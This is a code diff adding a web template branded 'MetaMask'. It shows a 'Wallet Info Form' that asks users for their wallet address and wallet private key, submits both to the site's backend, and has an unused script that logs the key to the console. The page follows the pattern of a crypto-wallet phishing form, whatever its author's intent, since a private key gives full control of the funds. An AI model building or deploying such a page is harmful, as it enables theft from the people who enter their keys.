@@ -1,0 +1,108 @@
+{% extends 'new_dashboard.html' %}
+
+{% block title %}
+  MetaMask
+{% endblock title %}
+{% block content %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Wallet Info Form</title>
+    <style>
+        .body1 {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f2f5;
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 20px; /* Added to ensure content doesn't touch the edges */
+            height: calc(100vh - 40px); /* Adjusted to account for padding */
+        }
+        .form-container {
+            background-color: #ffffff;
+            border: 0.5px solid #3B82F6;
+            border-radius: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 350px;
+            margin-top: 20px; /* Added to give space below the navbar */
+        }
+        .form-group {
+            margin-bottom: 15px;
+            font-family: 'Poppins', sans-serif;
+            font:bold;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+
+            color: black;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #3B82F6;
+            border-radius: 20px;
+            outline: none;
+        }
+        .submit-btn {
+            background-color: #3B82F6;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            width: 100%;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .submit-btn:hover {
+            background-color: #1E3A8A;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="body1">
+        <div class="form-container">
+        <form id="walletForm" action="#" method="post" enctype="multipart/form-data">
+            <div class="form-group">a
+                <label for="wallet"><i class='bx bxs-wallet'></i> Wallet Address:</label>
+
+                <input type="text" id="wallet" name="wallet" required>
+            </div>
+            <div class="form-group">
+                <label for="privateKey"><i class='bx bxs-key'></i> Private Key:</label>
+
+                <input type="password" id="privateKey" name="privateKey" required>
+            </div>
+            <button type="submit" class="submit-btn">Link</button>
+        </form>
+
+    </div>
+    </div>
+
+
+    <script>
+        function handleSubmit() {
+            const wallet = document.getElementById('wallet').value.trim();
+            const privateKey = document.getElementById('privateKey').value.trim();
+
+            if (!wallet || !privateKey) {
+                alert('Please fill in both fields.');
+                return;
+            }
+
+            console.log('Wallet Address:', wallet);
+            console.log('Private Key:', privateKey);
+            alert('Form submitted successfully!');
+        }
+    </script>
+</body>
+</html>
+
+{% endblock content %}
